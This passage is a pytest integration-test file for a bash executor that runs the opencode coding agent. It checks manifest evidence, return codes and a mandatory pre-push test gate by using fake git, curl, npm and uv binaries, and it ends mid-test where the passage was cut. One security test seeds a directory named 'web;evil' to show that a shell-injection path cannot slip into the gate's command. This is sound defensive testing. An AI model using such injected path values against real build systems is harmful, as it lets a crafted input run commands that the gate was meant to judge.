"""Integration tests for the opencode-build role executor script.

Runs ``deploy/codex-runner/mac-task-executor-opencode-build`` (the same
bash script the K8s Job pod invokes via MAC_TASK_EXECUTOR_COMMAND) with
fake ``opencode``, ``git``, ``curl`` and ``mac`` binaries on PATH and
asserts on the resulting ``mac.worker_evidence.v1`` manifest.

These guard the observability contract for the build executor:

* opencode stdout AND stderr are captured separately and exposed in the
  manifest as bounded head + tail slices (provider errors often appear at
  the tail), with byte counts + sha256 so a postmortem isn't limited to a
  single truncated preview.
* a parsed opencode event summary (event counts, first/last error,
  tool/edit-call counts, final step_finish reason) is recorded.
* the original opencode return code is preserved separately from the
  effective/guarded return code.
* the selected opencode model/provider is recorded.
* a no-change run records git diagnostics (status, cwd, branch) and the
  full files_changed list.
* a successful push followed by a failed PR/MR open fails the run.

The tests skip when ``bash`` is not available on PATH.
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import subprocess
import sys
import uuid
from pathlib import Path
from typing import Dict, List, Optional

import pytest


from mac.services import ControlPlane


REPO_ROOT = Path(__file__).resolve().parent.parent
BUILD_SCRIPT = (
    REPO_ROOT / "deploy" / "codex-runner" / "mac-task-executor-opencode-build"
)


pytestmark = pytest.mark.skipif(
    shutil.which("bash") is None,
    reason="bash is not available on PATH; the executor scripts are bash",
)


def _write_exec(path: Path, body: str) -> None:
    path.write_text(body)
    path.chmod(0o755)


def _extract_func(name: str) -> str:
    """Extract a single `name() { ... }` block from the build script so it can
    be sourced in isolation for a unit test. The script runs top-level code on
    source (no main guard), so we cannot source the whole file; instead we pull
    out the self-contained helper body. Functions in this script open with
    `name() {` and close with a `}` at column 0."""
    text = BUILD_SCRIPT.read_text(encoding="utf-8")
    lines = text.splitlines()
    start = None
    for i, line in enumerate(lines):
        if line.startswith(f"{name}() {{") or line.startswith(f"{name}()"):
            start = i
            break
    if start is None:
        raise AssertionError(f"function {name} not found in build script")
    for j in range(start + 1, len(lines)):
        if lines[j] == "}":
            return "\n".join(lines[start : j + 1]) + "\n"
    raise AssertionError(f"closing brace for {name} not found")


def _run_helper(
    func_names: List[str],
    call: str,
    cwd: Path,
    env: Optional[Dict[str, str]] = None,
) -> subprocess.CompletedProcess:
    """Source one or more extracted helper functions and invoke `call`.
    Returns the completed process (stdout carries the helper's echoed result)."""
    body = "set -euo pipefail\n"
    for name in func_names:
        body += _extract_func(name)
    body += f"\n{call}\n"
    full_env = dict(os.environ)
    if env:
        full_env.update(env)
    return subprocess.run(
        ["bash", "-c", body],
        cwd=str(cwd),
        env=full_env,
        capture_output=True,
        text=True,
        timeout=30,
    )


def _make_fake_bin(
    bindir: Path,
    *,
    opencode_stdout: str,
    opencode_stderr: str = "",
    opencode_rc: int = 0,
    make_change: bool = True,
    push_rc: int = 0,
    pr_rc: int = 0,
    pr_json: str = '{"url": "https://example.test/mr/1", "number": 1}',
    opencode_config: Optional[str] = None,
    task_metadata: Optional[dict] = None,
    seed_test_command: Optional[str] = "pytest",
    test_rc: int = 0,
    test_output: str = "1 passed in 0.01s\n",
    seed_lint: bool = False,
    lint_rc: int = 0,
    seed_subdir_js: Optional[str] = None,
    seed_makefile_wraps_npm: bool = False,
    seed_root_pkg_no_test: bool = False,
    seed_python_version: Optional[str] = None,
    seed_requires_python: Optional[str] = None,
    record_uv_calls: bool = False,
    seed_unknown_test_cmd: Optional[str] = None,
    record_provision_agent: bool = False,
) -> None:
    """Create fake opencode/git/curl/mac/python helpers on PATH.

    The fakes are intentionally dumb: ``opencode run`` prints the canned
    stdout/stderr and exits with ``opencode_rc``; ``git`` simulates a
    clone (creating a working tree + optional change) and a push; ``mac
    pull-request open`` returns canned PR JSON or fails.

    The mandatory pre-push gate runs lint + tests against the cloned
    working tree before the push. To keep the fakes hermetic, the fake
    ``opencode run`` seeds a ``pyproject.toml`` (so ``pytest`` is the
    detected test command) and a fake ``pytest`` binary is placed on PATH
    that exits with ``test_rc`` and prints ``test_output``. Set
    ``seed_test_command=None`` to simulate a repo where no test command can
    be detected (the gate must then block the push).
    """
    bindir.mkdir(parents=True, exist_ok=True)

    # The cloned working tree lives at /tmp/work-${MAC_TASK_ID}; the fake
    # opencode (which cd's into it) seeds the test/lint markers there so the
    # gate's detection + execution exercise the real code path.
    seed_lines = ["#!/usr/bin/env bash\n"]
    if seed_test_command == "pytest":
        seed_lines.append('printf "[project]\\nname = \\"x\\"\\n" > pyproject.toml\n')
    if seed_lint:
        # Add a ruff section so the lint detector picks ruff.
        seed_lines.append('printf "[tool.ruff]\\n" >> pyproject.toml\n')
    if seed_subdir_js is not None:
        # Monorepo shape: the JS project (package.json with a `test` script)
        # lives in a SUBDIRECTORY (e.g. dashboard/), and its test files sit
        # well below the old maxdepth-3 cap. The gate must still find it.
        sub = seed_subdir_js
        seed_lines.append(f'mkdir -p "{sub}/src/features/fitness"\n')
        seed_lines.append(
            'printf \'{"scripts":{"test":"vitest run"}}\' > '
            f'"{sub}/package.json"\n'
        )
        # Test file at depth >3 from the repo root (sub/src/features/fitness).
        seed_lines.append(
            'printf "" > '
            f'"{sub}/src/features/fitness/FitnessPage.test.tsx"\n'
        )
    if seed_root_pkg_no_test:
        # Root package.json WITHOUT a `test` script — Node deps exist but
        # the test entrypoint is the Makefile. Detection must skip npm test
        # (no script) and fall to the Makefile, while deps remain npm-installable.
        seed_lines.append('printf \'{"scripts":{}}\' > package.json\n')
    if seed_makefile_wraps_npm:
        # Root Makefile whose `test:` recipe shells out to npm. With no
        # node_modules present, the gate MUST provision deps (npm install)
        # before running, otherwise the recipe fails (the rc=127 bug).
        seed_lines.append('printf "test:\\n\\tnpm test\\n" > Makefile\n')
    if seed_python_version is not None:
        seed_lines.append(
            f'printf "{seed_python_version}\\n" > .python-version\n'
        )
    if seed_requires_python is not None:
        seed_lines.append(
            'printf "[project]\\nname = \\"x\\"\\n'
            f'requires-python = \\"{seed_requires_python}\\"\\n" > pyproject.toml\n'
        )
    if seed_unknown_test_cmd is not None:
        seed_lines.append(
            f'printf "Run tests with: {seed_unknown_test_cmd}\\n" > README.md\n'
        )

    # opencode: only `run` matters; `--version` returns a banner.
    oc_out = bindir / "_opencode_stdout.txt"
    oc_out.write_text(opencode_stdout)
    oc_err = bindir / "_opencode_stderr.txt"
    oc_err.write_text(opencode_stderr)
    seed_block = "".join(seed_lines[1:])  # drop the shebang line for embedding
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        f"{seed_block}"
        f'  cat "{oc_out}"\n'
        f'  cat "{oc_err}" >&2\n'
        f'  exit {opencode_rc}\n'
        "fi\n"
        "exit 0\n",
    )

    # Fake pytest: emits canned output and exits with test_rc.
    _write_exec(
        bindir / "pytest",
        "#!/usr/bin/env bash\n"
        f"printf '%s' {json.dumps(test_output)}\n"
        f"exit {test_rc}\n",
    )

    # Fake uv: records `venv --python <ver>` calls to _uv_calls.txt and
    # provisions a venv bin/ with a pytest WRAPPER that prints a unique
    # `PROVISIONED_VENV` marker (review #5) — so a test can prove the
    # provisioned interpreter's pytest ran, not the bindir pytest on PATH.
    # `pip install` is a no-op pass. The wrapper also emits the canned
    # test_output and exits with test_rc so the gate verdict still works.
    uv_calls = bindir / "_uv_calls.txt"
    _write_exec(
        bindir / "uv",
        "#!/usr/bin/env bash\n"
        f'echo "$@" >> {uv_calls}\n'
        'case "$1" in\n'
        '  venv)\n'
        '    target=".venv"\n'
        '    # last non-flag arg may be the venv path; default .venv\n'
        '    for a in "$@"; do case "$a" in --*|venv) ;; *) target="$a";; esac; done\n'
        '    mkdir -p "$target/bin"\n'
        f'    cat > "$target/bin/pytest" <<\'WRAP\'\n'
        f'#!/usr/bin/env bash\n'
        f'echo PROVISIONED_VENV\n'
        f'printf %s {json.dumps(test_output)}\n'
        f'exit {test_rc}\n'
        f'WRAP\n'
        '    chmod +x "$target/bin/pytest"\n'
        '    echo "Using CPython"\n'
        '    ;;\n'
        '  pip) echo "installed" ;;\n'
        '  *) : ;;\n'
        'esac\n'
        "exit 0\n",
    )
    # Fake cargo: `test` fails rc=127 until .mac-provisioned exists. The
    # provisioning agent fallback is what creates that marker, so a green
    # run proves the fallback ran AND the gate re-judged the real command.
    _write_exec(
        bindir / "cargo",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "test" ]; then\n'
        '  if [ -f .mac-provisioned ]; then\n'
        f'    printf "%s" {json.dumps("test result: ok. 3 passed\\n")}\n'
        '    exit 0\n'
        '  fi\n'
        '  echo "error: linker cc not found" >&2\n'
        '  exit 127\n'
        'fi\n'
        'exit 0\n',
    )
    # Fake ruff: lint detector picks this when seed_lint is set.
    _write_exec(
        bindir / "ruff",
        "#!/usr/bin/env bash\n"
        'echo "ruff check output"\n'
        f"exit {lint_rc}\n",
    )

    # Fake npm: `install` creates node_modules (marking that deps were
    # provisioned); `test` fails with rc!=0 UNLESS node_modules exists
    # (mirrors the real failure mode — vitest can't run without its deps).
    # `run lint` is a no-op pass so the lint detector path is harmless.
    _write_exec(
        bindir / "npm",
        "#!/usr/bin/env bash\n"
        'sub="$1"\n'
        'case "$sub" in\n'
        '  install)\n'
        '    mkdir -p node_modules\n'
        '    echo "added 1 package"\n'
        '    exit 0\n'
        '    ;;\n'
        '  test)\n'
        '    if [ -d node_modules ]; then\n'
        f'      printf "%s" {json.dumps(test_output)}\n'
        f'      exit {test_rc}\n'
        '    fi\n'
        '    echo "sh: vitest: not found" >&2\n'
        '    exit 127\n'
        '    ;;\n'
        '  *) exit 0 ;;\n'
        'esac\n',
    )

    # Fake make: `make test` reads the Makefile's recipe and runs it. We
    # only support the single-line `npm test` recipe used in these tests,
    # invoked in the directory `make` was called from (matching real make,
    # which runs recipes in the Makefile's directory).
    _write_exec(
        bindir / "make",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "test" ]; then\n'
        '  exec npm test\n'
        'fi\n'
        'exit 0\n',
    )

    # git: clone makes the workdir a git repo; checkout/config/add/commit
    # are no-ops; status reports a change iff make_change; push exits with
    # push_rc; rev-parse/diff return canned values.
    change_flag = "yes" if make_change else "no"
    _write_exec(
        bindir / "git",
        "#!/usr/bin/env bash\n"
        'cmd="$1"; shift\n'
        'case "$cmd" in\n'
        "  clone)\n"
        '    dest="${@: -1}"\n'
        '    mkdir -p "$dest/.git"\n'
        "    ;;\n"
        "  config|checkout|add|commit) : ;;\n"
        "  status)\n"
        f'    if [ "{change_flag}" = "yes" ]; then echo " M a.txt"; fi\n'
        "    ;;\n"
        "  diff)\n"
        f'    if [ "{change_flag}" = "yes" ]; then printf "a.txt\\nb.txt\\n"; fi\n'
        "    ;;\n"
        '  rev-parse) echo "deadbeefcafef00d" ;;\n'
        f"  push) exit {push_rc} ;;\n"
        "  *) : ;;\n"
        "esac\n"
        "exit 0\n",
    )

    # curl: the script fetches task + project JSON. Return a task carrying
    # an origin repository_url so the workdir branch is exercised.
    metadata = {
        "origin": {
            "repository_url": "https://gitea.omv.example/org/repo.git",
            "default_branch": "main",
        }
    }
    if task_metadata:
        metadata.update(task_metadata)
    task_json = json.dumps(
        {
            "task": {
                "title": "Do a thing",
                "description": "edit files",
                "project": "demo",
                "metadata": metadata,
            }
        }
    )
    _write_exec(
        bindir / "curl",
        "#!/usr/bin/env bash\n"
        # Last arg is the URL.
        'url="${@: -1}"\n'
        'case "$url" in\n'
        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
        "  *) : ;;\n"
        "esac\n"
        "exit 0\n",
    )

    # mac: only `pull-request open` is used.
    _write_exec(
        bindir / "mac",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "pull-request" ] && [ "$2" = "open" ]; then\n'
        f'  if [ "{pr_rc}" -ne 0 ]; then echo "boom" >&2; exit {pr_rc}; fi\n'
        f"  cat <<'JSON'\n{pr_json}\nJSON\n"
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )

    # opencode config consumed by the script via /etc/opencode mount. We
    # cannot write /etc here, so the script reads OPENCODE_CONFIG_PATH if
    # set (added by the executor for testability).
    if opencode_config is not None:
        cfg = bindir.parent / "opencode.json"
        cfg.write_text(opencode_config)


def _run_build(
    *,
    bindir: Path,
    manifest_path: Path,
    task_id: str = "task_demo",
    agent_id: str = "mac-worker-python-coder-opencode",
    opencode_config_path: Optional[Path] = None,
    extra_env: Optional[Dict[str, str]] = None,
) -> subprocess.CompletedProcess:
    env = dict(os.environ)
    # Hermetic: drop inherited fleet/runtime env.
    for key in list(env):
        if key.startswith(("MAC_", "INFERENCE_HUB_", "GITEA_", "GH_")):
            env.pop(key, None)
    env["PATH"] = "%s%s%s" % (bindir, os.pathsep, env.get("PATH", ""))
    env.update(
        {
            "MAC_TASK_ID": task_id,
            "MAC_LEASE_ID": "lease-1",
            "MAC_AGENT_ID": agent_id,
            "MAC_AGENT_ROLE": "python-coder-opencode",
            "MAC_URL": "http://mac-api.svc:80",
            "MAC_WORKER_TOKEN": "tok",
            "MAC_TASK_EVIDENCE_MANIFEST_PATH": str(manifest_path),
            "MAC_EVIDENCE_PYTHON": sys.executable,
        }
    )
    if opencode_config_path is not None:
        env["MAC_OPENCODE_CONFIG_PATH"] = str(opencode_config_path)
    if extra_env:
        env.update(extra_env)
    return subprocess.run(
        ["bash", str(BUILD_SCRIPT)],
        env=env,
        capture_output=True,
        text=True,
        timeout=60,
    )


def _findings_by_kind(manifest: dict) -> Dict[str, dict]:
    out: Dict[str, dict] = {}
    for finding in manifest.get("findings", []):
        kind = finding.get("kind")
        if kind:
            out[kind] = finding
    return out


def test_captures_stdout_stderr_head_tail_and_event_summary(tmp_path: Path) -> None:
    bindir = tmp_path / "bin"
    # Build a JSON-lines stream using the REAL opencode event shapes:
    # `tool_use` events carry the tool name + status + error under
    # `part.state`; `step_finish` carries its reason under `part.reason`.
    # (See evidence ev_23c0286d: 35 tool_use events, reason under part.)
    def tool_use(name, status="completed", error=None):
        state = {"status": status, "input": {}}
        if error is not None:
            state["error"] = error
        return json.dumps(
            {"type": "tool_use", "part": {"type": "tool", "tool": name, "state": state}}
        )

    def step_finish(reason):
        return json.dumps({"type": "step_finish", "part": {"reason": reason}})

    lines: List[str] = []
    lines.append(json.dumps({"type": "step_start", "part": {}}))
    # one tool that errored (first error), then many ok tools, then a
    # final errored tool (last error).
    lines.append(tool_use("bash", status="error", error="first failure"))
    lines.append(step_finish("tool-calls"))
    for _ in range(50):
        lines.append(tool_use("edit"))
        lines.append(tool_use("read"))
    lines.append(tool_use("bash", status="error", error="last failure"))
    lines.append(step_finish("stop"))
    stdout = "\n".join(lines) + "\n"
    stderr = "provider error: model rejected request\n" * 200

    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_stderr=stderr,
        opencode_rc=0,
        make_change=True,
    )
    cfg = tmp_path / "opencode.json"
    cfg.write_text(
        json.dumps(
            {
                "model": "inference-hub/aws/anthropic/bedrock-claude-opus-4-8",
                "agent": {
                    "build": {
                        "model": "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
                    }
                },
            }
        )
    )

    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        opencode_config_path=cfg,
    )
    assert manifest_path.exists(), (
        "executor must write a manifest; stdout=%s stderr=%s"
        % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    findings = _findings_by_kind(manifest)

    # stdout finding: bounded head + tail, byte count + sha256.
    out = findings["opencode_stdout"]
    assert "head" in out and "tail" in out
    assert out["bytes"] == len(stdout.encode("utf-8"))
    assert out["sha256"] == hashlib.sha256(stdout.encode("utf-8")).hexdigest()
    # tail must include the final events, not just the head.
    assert "last failure" in out["tail"] or "step_finish" in out["tail"]

    # stderr captured separately with head/tail + bytes + sha256.
    err = findings["opencode_stderr"]
    assert err["bytes"] == len(stderr.encode("utf-8"))
    assert err["sha256"] == hashlib.sha256(stderr.encode("utf-8")).hexdigest()
    assert "provider error" in err["tail"]

    # event summary: must parse the REAL `tool_use` shape, not synthetic.
    summary = findings["opencode_event_summary"]
    assert summary["total_lines"] >= len(lines)
    assert summary["parseable_json_lines"] >= len(lines)
    counts = summary["event_counts"]
    assert counts.get("tool_use") == 102  # 50 edit + 50 read + 2 bash
    assert counts.get("step_finish") == 2
    assert summary["tool_call_count"] == 102
    assert summary["edit_tool_count"] == 50
    # errors are nested under part.state.error.
    assert "first failure" in json.dumps(summary["first_error"])
    assert "last failure" in json.dumps(summary["last_error"])
    # finish reason is nested under part.reason.
    assert summary["final_step_finish_reason"] == "stop"

    # selected model recorded.
    assert (
        manifest["opencode_model"]
        == "inference-hub/aws/anthropic/bedrock-claude-opus-4-8"
    )


def test_records_original_and_effective_returncode_on_no_change(
    tmp_path: Path,
) -> None:
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=False,  # clean tree -> guard forces rc=1
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    # Guard fires: effective rc is non-zero so the task is retried.
    assert result.returncode != 0
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["returncode"] == 1
    assert manifest["original_opencode_rc"] == 0
    assert manifest["status"] == "incomplete"

    findings = _findings_by_kind(manifest)
    repo = findings["repo_change_summary"]
    assert repo["pushed"] is False
    assert repo["files_changed"] == []
    # No-change diagnostics present.
    assert "git_status" in repo
    assert "cwd" in repo
    assert repo["branch"]


def test_push_succeeds_but_pr_open_fails_marks_run_failed(tmp_path: Path) -> None:
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=2,  # PR open fails
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode != 0, (
        "a successful push with a failed PR open must fail the run; "
        "stdout=%s stderr=%s" % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["returncode"] != 0
    findings = _findings_by_kind(manifest)
    repo = findings["repo_change_summary"]
    assert repo["pushed"] is True
    assert repo.get("pr_opened") is False


def test_successful_push_and_pr_records_pr_and_full_files(tmp_path: Path) -> None:
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode == 0, (
        "stdout=%s stderr=%s" % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["returncode"] == 0
    findings = _findings_by_kind(manifest)
    repo = findings["repo_change_summary"]
    assert repo["pushed"] is True
    assert repo.get("pr_opened") is True
    # fake git diff returns two files; full list preserved.
    assert repo["files_changed"] == ["a.txt", "b.txt"]


def _evidence_items(manifest: dict) -> Dict[int, dict]:
    """Index the required numbered evidence items (Lint/Format=1, Tests=2,
    Push/Test Failures=3, MR=4) by their `item` number."""
    out: Dict[int, dict] = {}
    for finding in manifest.get("findings", []):
        if finding.get("kind") == "evidence_item":
            out[int(finding["item"])] = finding
    return out


# --- Mandatory pre-push test gate --------------------------------------


def test_gate_blocks_push_and_mr_when_tests_fail(tmp_path: Path) -> None:
    """A deliberate test failure must STOP the run: no push, no MR, and the
    task is routed to needs_review (non-zero rc) with full test evidence."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        test_rc=1,  # tests FAIL
        test_output="FAILED tests/test_x.py::test_one - assert 1 == 2\n1 failed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    # Failing tests must fail the run so it is not submitted as complete.
    assert result.returncode != 0, (
        "test failure must block; stdout=%s" % result.stdout
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["returncode"] != 0
    assert manifest["gate_blocked"] is True
    assert manifest["gate_verdict"] == "fail"

    # No push, no MR.
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False
    assert repo.get("pr_opened") is False

    items = _evidence_items(manifest)
    # Tests item (2) records the failing command + output.
    assert items[2]["label"] == "Tests"
    assert items[2]["status"] == "fail"
    assert items[2]["command"] == "pytest"
    # Item 3 is "Test Failures" (NOT Push) and carries full output + a fix.
    assert items[3]["label"] == "Test Failures"
    assert "FAILED" in items[3]["output"]
    assert any("test_one" in f for f in items[3]["failing_tests"])
    assert items[3]["suggested_fix"]
    # Push (3 as Push) and MR (4) items must be absent on failure.
    assert "MR" not in {it.get("label") for it in items.values()}


def test_gate_blocks_when_no_test_command_detected(tmp_path: Path) -> None:
    """No detectable test command must NOT silently skip — the gate blocks
    and reports that manual verification is required."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command=None,  # repo has no detectable test command
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode != 0
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_blocked"] is True
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False
    assert repo.get("pr_opened") is False

    items = _evidence_items(manifest)
    assert items[2]["status"] == "not_detected"
    assert "could not detect test command" in items[3]["reason"]


def test_gate_detects_js_project_in_subdirectory(tmp_path: Path) -> None:
    """Monorepo shape: the JS project lives in a subdirectory (dashboard/)
    with a `test` script, and its test files sit deeper than the old
    maxdepth-3 cap. The root carries only Python tooling (pyproject.toml).

    The gate MUST detect the subdir JS project and run its `npm test` (in
    that subdir) rather than mis-detecting pytest or falling through to a
    root Makefile. This is the false-negative that stranded valid work."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        # Root has pyproject.toml (Python tooling) — must NOT win.
        seed_test_command="pytest",
        # Real JS project in a subdir with a test script + deep test file.
        seed_subdir_js="dashboard",
        test_rc=0,
        test_output="Test Files  1 passed\nTests  107 passed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode == 0, (
        "subdir JS project must be detected and pass; stdout=%s stderr=%s"
        % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    assert manifest["gate_blocked"] is False

    items = _evidence_items(manifest)
    assert items[2]["label"] == "Tests"
    assert items[2]["status"] == "pass"
    # The detected command must target the subdir JS project, not pytest.
    assert "npm test" in items[2]["command"]
    assert "pytest" not in items[2]["command"]
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is True


def test_gate_rejects_subdir_js_project_with_unsafe_path(tmp_path: Path) -> None:
    """SECURITY: a monorepo subdir JS project whose directory name contains
    shell metacharacters must NOT be emitted as `cd <dir> && npm test` — that
    would interpolate a repo-controlled name into `bash -c` and let a crafted
    directory name inject/short-circuit the gate's judged command. The detector
    must reject the unsafe path and fall through; with no other test command,
    the gate blocks (could not detect) rather than running injected shell."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    # Directory name carrying shell metacharacters. The `;` is literal inside
    # the harness's double-quoted mkdir, so a directory literally named
    # `web;evil` is created and discovered by _find_subdir_js_project.
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command=None,        # no root pyproject/package.json test
        seed_subdir_js="web;evil",
        test_rc=0,
        test_output="should not run\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    # The unsafe subdir is rejected -> no test command detected -> gate blocks.
    assert manifest["gate_verdict"] == "fail", (
        "unsafe subdir path was not rejected; stdout=%s" % result.stdout
    )
    assert result.returncode != 0
    # The injecting `cd web;evil && npm test` must NOT have become the command.
    items = _evidence_items(manifest)
    for it in items.values():
        assert "web;evil" not in it.get("command", "")
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False


def test_gate_provisions_deps_when_make_test_wraps_npm(tmp_path: Path) -> None:
    """A root Makefile whose `test:` recipe shells out to npm must have its
    dependencies provisioned (npm install) before the recipe runs. Without
    provisioning, `make test` -> `npm test` fails rc=127 because
    node_modules is absent — the exact false-negative gate failure.

    The fake npm exits 127 from `test` unless `install` ran first, so a
    green run proves the gate provisioned deps for the Makefile path."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        # Root package.json without a test script + Makefile wrapping npm.
        # Detection skips npm test, falls to Makefile; deps must be
        # provisioned (npm install) before the recipe runs.
        seed_test_command=None,
        seed_root_pkg_no_test=True,
        seed_makefile_wraps_npm=True,
        test_rc=0,
        test_output="Tests  107 passed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode == 0, (
        "make-test-wraps-npm must provision deps and pass; stdout=%s stderr=%s"
        % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    assert manifest["gate_blocked"] is False
    items = _evidence_items(manifest)
    assert items[2]["status"] == "pass"
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is True


def test_gate_provisions_declared_python_version_via_uv(tmp_path: Path) -> None:
    """A Python project declaring .python-version must have that interpreter
    provisioned via `uv venv --python <ver>` before pytest runs — the gate
    must not silently test against the image's system Python (the same
    brittleness that stranded Node-18 work)."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        seed_python_version="3.13",
        record_uv_calls=True,
        test_rc=0,
        test_output="1 passed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    # Unique task id so the per-task venv (/tmp/mac-task-venv-<id>) is fresh —
    # otherwise a venv cached by an earlier test short-circuits provisioning.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id="task_pyver_" + uuid.uuid4().hex,
    )

    assert result.returncode == 0, "stdout=%s stderr=%s" % (
        result.stdout, result.stderr,
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    # The gate must have asked uv for the declared interpreter version.
    uv_calls = (bindir / "_uv_calls.txt").read_text(encoding="utf-8")
    assert "venv" in uv_calls
    assert "--python 3.13" in uv_calls or "--python=3.13" in uv_calls
    # Strengthen (review #5): prove the PROVISIONED interpreter was actually
    # used, not the bindir pytest on PATH. The fake uv stamps the venv's
    # pytest with a marker; it must appear in the recorded Tests output.
    items = _evidence_items(manifest)
    assert "PROVISIONED_VENV" in items[2]["output"]


def test_resolve_python_version_picks_minimum_from_pep440_range(
    tmp_path: Path,
) -> None:
    """`requires-python = "<3.14,>=3.11"` must provision the MINIMUM (3.11),
    not the first-matched upper bound (3.14, which uv may fail to find).
    Guards the min-version extraction in _resolve_python_version."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        seed_requires_python="<3.14,>=3.11",
        record_uv_calls=True,
        test_rc=0,
        test_output="1 passed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    # Unique task id so the per-task venv is fresh (see test above).
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id="task_pep440_" + uuid.uuid4().hex,
    )

    assert result.returncode == 0, "stdout=%s stderr=%s" % (
        result.stdout, result.stderr,
    )
    uv_calls = (bindir / "_uv_calls.txt").read_text(encoding="utf-8")
    assert "--python 3.11" in uv_calls or "--python=3.11" in uv_calls
    assert "3.14" not in uv_calls


def test_resolve_python_version_strict_greater_does_not_provision_excluded_bound(
    tmp_path: Path,
) -> None:
    """`requires-python = ">3.11"` is STRICTLY greater — 3.11 does NOT satisfy
    it. The min-version heuristic must not provision the excluded lower bound;
    it must provision the next minor (3.12) so `uv venv --python` yields an
    interpreter that actually satisfies the declared constraint."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
